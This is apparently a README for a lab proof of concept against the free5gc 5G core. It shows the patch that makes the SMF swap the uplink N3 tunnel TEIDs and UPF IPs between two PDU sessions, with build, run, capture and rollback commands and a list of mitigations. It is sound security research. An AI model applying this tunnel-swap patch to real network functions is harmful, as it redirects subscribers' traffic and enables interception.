# Compromised SMF — Uplink N3 Tunnel Swap Attack (PoC)

## Overview

This PoC demonstrates a **Compromised SMF** vulnerability in a 5G Core Network where the SMF intentionally swaps the **Uplink N3 Tunnel Information** (GTP-U TEID + UPF IP) between two PDU sessions served by different UPFs.

This topology replaces the normal lab stack during a run, so use `./script/attack-up.sh`, `./script/attack-down.sh`, and `./script/rollback-to-normal.sh` instead of manually juggling project names or deleting Docker networks.

As a result:
- **UE1's uplink traffic** is routed to **UPF2** (instead of UPF1)
- **UE2's uplink traffic** is routed to **UPF1** (instead of UPF2)

This is a **data plane integrity attack** — the control plane (SMF) manipulates the
N2 SM Information sent to the RAN, causing the gNB to send GTP-U encapsulated uplink
packets to the wrong UPF.

---

## Architecture

```
                    ┌──────────────────────────────────┐
                    │       Compromised SMF             │
                    │  (tunnel_swap.go injected)        │
                    │                                    │
                    │  PFCP (N4) ──┬── UPF1 (10.100.200.101)
                    │              └── UPF2 (10.100.200.102)
                    └────────┬─────────────────────────┘
                             │ N2 (NGAP)
                    ┌────────┴─────────┐
                    │       AMF        │
                    └────────┬─────────┘
                             │ N2 (NGAP)
                    ┌────────┴─────────┐
                    │       gNB        │
                    │   (UERANSIM)     │
                    └──┬──────────┬────┘
                       │ N3(GTP-U)│ N3(GTP-U)
                       ▼          ▼
Normal:          UE1→UPF1    UE2→UPF2
After Attack:    UE1→UPF2    UE2→UPF1    ← SWAPPED!
```

## Attack Flow

1. **UE1** initiates a PDU session (S-NSSAI: SST=1, SD=010203). SMF assigns **UPF1**.
   UPF1 allocates UL Tunnel Info A: `(IP=10.100.200.101, TEID=TEID_A)`.

2. **UE2** initiates a PDU session (S-NSSAI: SST=1, SD=112233). SMF assigns **UPF2**.
   UPF2 allocates UL Tunnel Info B: `(IP=10.100.200.102, TEID=TEID_B)`.

3. The **compromised SMF** intercepts `BuildPDUSessionResourceSetupRequestTransfer()`
   which constructs the N2 SM Information (containing UL NG-U UP TNL Information).

4. On the **first** call, the attack records Tunnel Info A and passes it through normally.
   On the **second** call, the attack records Tunnel Info B and **swaps**: session 2 gets
   Tunnel Info A. On any subsequent rebuild for session 1, it gets Tunnel Info B.

5. The RAN (gNB) receives the swapped tunnel info and creates GTP-U tunnels accordingly:
   - UE1's uplink → sent to `(10.100.200.102, TEID_B)` → **UPF2**
   - UE2's uplink → sent to `(10.100.200.101, TEID_A)` → **UPF1**

---

## Files

| File | Purpose |
|------|---------|
| `tunnel_swap.go` | Go source: attack state machine injected into `smf/internal/context/` |
| `build_compromised_smf.sh` | Clones SMF, patches source, builds compromised Docker image |
| `docker-compose-attack.yaml` | Docker Compose with 2 UPFs + compromised SMF + 2 UEs |
| `config/smfcfg-attack.yaml` | SMF config with 2 UPF nodes (UPF1, UPF2) |
| `config/upf1cfg.yaml` | UPF1 config (pool 10.60.0.0/16, N4/N3 on upf1.free5gc.org) |
| `config/upf2cfg.yaml` | UPF2 config (pool 10.61.0.0/16, N4/N3 on upf2.free5gc.org) |
| `config/ue1cfg.yaml` | UE1 config (IMSI ...0001, S-NSSAI SST=1/SD=010203) |
| `config/ue2cfg.yaml` | UE2 config (IMSI ...0002, S-NSSAI SST=1/SD=112233) |
| `config/gnbcfg.yaml` | gNB config (supports both S-NSSAIs) |
| `config/uerouting-attack.yaml` | Minimal UE routing (no ULCL) |
| `provision_subscribers.sh` | Provisions UE1 + UE2 in MongoDB |
| `run_attack.sh` | Existing one-command attack workflow that builds, switches modes, provisions, and verifies |
| `run_attack_from_scratch.sh` | One-shot: tear down, bring up, provision, UE1→UE2, capture N3 pcap, proof report (run with `sudo` for pcap) |
| `run_attack_with_pcap.sh` | Wrapper that runs `sudo ./attack_poc/run_attack_from_scratch.sh` for capture-enabled proof run |
| `SINGLE_COMMAND_ATTACK_TUTORIAL.md` | Separate markdown tutorial for the existing one-command attack workflow (`./attack_poc/run_attack.sh`) |
| `VDI_ATTACK_COMMANDS.md` | Minimal command-only VDI runbook for branch switch, attack run, capture run, and rollback |
| `verify_attack.sh` | Captures N3 GTP-U traffic and analyzes TEID swap |
| `rollback.sh` | Tears down attack and restores original deployment |

---

## Exact Code Modifications

### Modified File: `smf/internal/context/ngap_build.go`

**Function:** `BuildPDUSessionResourceSetupRequestTransfer(ctx *SMContext)`

This function constructs the `PDUSessionResourceSetupRequestTransfer` IE which contains
the **UL NG-U UP TNL Information** — the UPF's N3 IP and GTP-U TEID. This is sent to
the AMF (via `N1N2MessageTransfer`) and forwarded to the gNB via NGAP.

**Original code** (lines ~55-73):
```go
// UL NG-U UP TNL Information
ie = ngapType.PDUSessionResourceSetupRequestTransferIEs{}
ie.Id.Value = ngapType.ProtocolIEIDULNGUUPTNLInformation
ie.Criticality.Value = ngapType.CriticalityPresentReject
if n3IP, err := UpNode.N3Interfaces[0].IP(ctx.SelectedPDUSessionType); err != nil {
    return nil, err
} else {
    ie.Value = ngapType.PDUSessionResourceSetupRequestTransferIEsValue{
        Present: ...,
        ULNGUUPTNLInformation: &ngapType.UPTransportLayerInformation{
            Present: ...,
            GTPTunnel: &ngapType.GTPTunnel{
                TransportLayerAddress: ...(n3IP),
                GTPTEID: ngapType.GTPTEID{Value: teidOct},
            },
        },
    }
}
```

**Patched code** — adds the swap hook after extracting n3IP:
```go
// ATTACK: Record original and get (possibly swapped) tunnel info
swappedTEID, swappedIP, wasSwapped := AttackState.RecordAndSwap(
    ctx.LocalULTeid, n3IP, ctx.Supi)
if wasSwapped {
    n3IP = swappedIP
    teidOct = swappedTEID
}
```

### New File: `smf/internal/context/tunnel_swap.go`

Contains the `TunnelSwapAttack` struct with `RecordAndSwap()` method — a global
singleton that collects tunnel info from two sessions and swaps them.

---

## Step-by-Step Instructions

### Prerequisites

- Docker & Docker Compose installed
- `gtp5g` kernel module loaded (`lsmod | grep gtp5g`)
- Git and Python3 available
- Sufficient RAM (~4GB for all containers)

### 1. Build the Compromised SMF Image

```bash
cd free5gc-compose
./attack_poc/build_compromised_smf.sh
```

This will:
- Clone `github.com/free5gc/smf` (main branch)
- Inject `tunnel_swap.go` into `internal/context/`
- Patch `ngap_build.go` with the swap hook
- Build Docker image `free5gc/smf:compromised`

### 2. Stop Any Existing Deployment

```bash
./script/normal-down.sh
```

### 3. Launch the Attack Topology

```bash
# From the free5gc-compose directory. Use --project-directory so paths resolve correctly.
./script/attack-up.sh
```

### 4. Provision Subscribers

Wait ~15 seconds for MongoDB to initialize, then:

```bash
./attack_poc/provision_subscribers.sh
```

### 5. Wait for Registration (UE1 first, then UE2)

Establish **UE1 first, then UE2** so the swap state matches the PoC (first session = UPF1, second = UPF2).
Wait ~20 seconds for the gNB, UE1, and UE2 to register and establish PDU sessions:

```bash
# Check gNB logs
docker logs ueransim-gnb 2>&1 | tail -10

# Check UE1 logs
docker logs ueransim-ue1 2>&1 | tail -10

# Check UE2 logs
docker logs ueransim-ue2 2>&1 | tail -10

# Check SMF logs for ATTACK markers
docker logs smf 2>&1 | grep -i "ATTACK"
```

### 6. Verify the Attack

```bash
./attack_poc/verify_attack.sh
```

---

## Run from scratch (one-shot + pcap proof)

From the repo root (`free5gc-compose`):

```bash
# For pcap proof you MUST run with sudo so host tcpdump can capture on the bridge:
sudo ./attack_poc/run_attack_from_scratch.sh
# Or use the wrapper (same effect):
./attack_poc/run_attack_with_pcap.sh
```

This tears down any existing attack stack, brings it up, provisions UE1/UE2, restarts gNB and UEs (UE1 then UE2), captures N3 GTP-U for 15s, and writes:

- **`attack_poc/captures/attack_proof_<timestamp>.pcap`** — GTP-U capture (when run with sudo)
- **`attack_poc/captures/attack_proof_report_<timestamp>.txt`** — SMF [ATTACK] lines, pcap size/count, and PROOF VERDICT

**Important:** Without `sudo`, the pcap will be 0 bytes and you cannot prove the attack in Wireshark. Always use `sudo` for a proof run.

### If authentication still fails (e.g. UDM "Nil PermanentKey")

The provision script writes auth subscription documents that match the openapi `sequenceNumber` shape (`{"sqn": "..."}`). If UE registration still fails:

1. Create the two subscribers via the **free5gc WebUI** (http://&lt;host&gt;:5000): Subscribers → Create.
2. Use IMSI **208930000000001** and **208930000000002**, key **8baf473f2f8fd09487cccbd7097c6862**, OPC **8e27b6af0e692e750f32667a3b14605d**, and the same S-NSSAIs (e.g. 1/010203 and 1/112233).
3. Bring up the attack stack and run `sudo ./attack_poc/run_attack_from_scratch.sh` **without** re-running `provision_subscribers.sh` for those UEs (so the WebUI-created data is used).

---

## Verification with tcpdump / Wireshark

Capture on the host bridge requires root; for proof, run the one-shot script with **`sudo ./attack_poc/run_attack_from_scratch.sh`** so the pcap is written.

### What to Look For

1. **Capture GTP-U on the N3 interface:**
   ```bash
   # On the host — captures all traffic on the Docker bridge (requires root)
   sudo tcpdump -i br-free5gc -w /tmp/n3_capture.pcap "udp port 2152"
   ```

2. **Generate uplink traffic from each UE:**
   ```bash
   docker exec ueransim-ue1 ping -I uesimtun0 -c 5 8.8.8.8
   docker exec ueransim-ue2 ping -I uesimtun0 -c 5 8.8.8.8
   ```

3. **Open the capture in Wireshark and apply filter:** `gtp`

4. **Examine each GTP-U packet's header:**
   - **TEID**: The GTP-U Tunnel Endpoint Identifier in the GTPv1 header
   - **Destination IP**: The outer UDP/IP destination (which UPF receives the packet)
   - **Inner IP Source**: The UE's assigned IP (10.60.x.x for UE1, 10.61.x.x for UE2)

5. **Expected Results (ATTACK SUCCESS):**

   | Uplink Packet | Inner Src IP | Outer Dst IP | TEID | Expected UPF |
   |--------------|-------------|-------------|------|-------------|
   | UE1 → internet | 10.60.0.x | **10.100.200.102** | TEID_B | **UPF2** (WRONG!) |
   | UE2 → internet | 10.61.0.x | **10.100.200.101** | TEID_A | **UPF1** (WRONG!) |

   **Direct proof of attack:** UE2's uplink GTP-U packets have **destination IP = UPF1** (10.100.200.101) and **TEID = TEID_A** (UPF1's UL TEID), instead of UPF2 and TEID_B. That shows the SMF swapped the UL tunnel info sent to the RAN for UE2.
   Normally UE1 (10.60.0.x) should go to UPF1 (10.100.200.101), but with the attack
   it goes to UPF2 (10.100.200.102). This proves the swap.

6. **Check SMF logs for confirmation:**
   ```bash
   docker logs smf 2>&1 | grep "ATTACK"
   ```
   You should see:
   ```
   [ATTACK] Recording session 1: SUPI=imsi-208930000000001, TEID=0x..., UPF_IP=10.100.200.101
   [ATTACK] Session 1 recorded. Waiting for session 2 before swap.
   [ATTACK] Recording session 2: SUPI=imsi-208930000000002, TEID=0x..., UPF_IP=10.100.200.102
   [ATTACK] *** SWAP EXECUTED ***
   [ATTACK] Session 2 gets Session 1's tunnel: TEID=0x... → 0x..., UPF_IP=10.100.200.102 → 10.100.200.101
   ```

---

## Return to Original State (Rollback)

You can return to the normal (non-attack) deployment at any time:

**Option A — Use normal stack (recommended):**

```bash
# From free5gc-compose directory
./script/rollback-to-normal.sh
```

This brings up the default compose with the **unmodified** SMF image (e.g. `free5gc/smf:v4.1.0`) and **one UPF**; no tunnel swap.

**Option B — Use the rollback script:**

```bash
./script/rollback-to-normal.sh
```

**Option C — Manual (same as Option A + optional image removal):**

```bash
./script/attack-down.sh
docker rmi free5gc/smf:compromised   # optional
./script/normal-up.sh
```

This restores the original single-UPF deployment using unmodified Docker Hub images.

**Option D — Same image, attack disabled in code:** In `tunnel_swap.go`, set `enabled: false` in the `AttackState` initializer, rebuild the compromised image, and deploy with the same attack compose; the SMF will pass through original tunnel info.

---

## Security Implications

This PoC demonstrates that a compromised SMF can:

1. **Redirect uplink user plane traffic** to an unintended UPF without any RAN or UE awareness
2. **Violate data plane isolation** between network slices / PDU sessions
3. **Enable traffic interception** if the attacker controls the receiving UPF
4. **Bypass integrity protections** since GTP-U on the N3 interface typically lacks integrity protection (no IPsec mandated between gNB and UPF in many deployments)

### Mitigations

- **Mutual authentication on N4** (PFCP): Ensure UPFs validate SMF identity
- **N3 IPsec tunnels**: Encrypt and authenticate GTP-U traffic between gNB and UPF
- **Integrity verification of N2 SM Info**: The RAN could cross-check tunnel info against known UPF addresses
- **Network Function integrity monitoring**: Detect unauthorized modifications to NF binaries
- **Zero-trust architecture**: Don't trust any single NF unconditionally
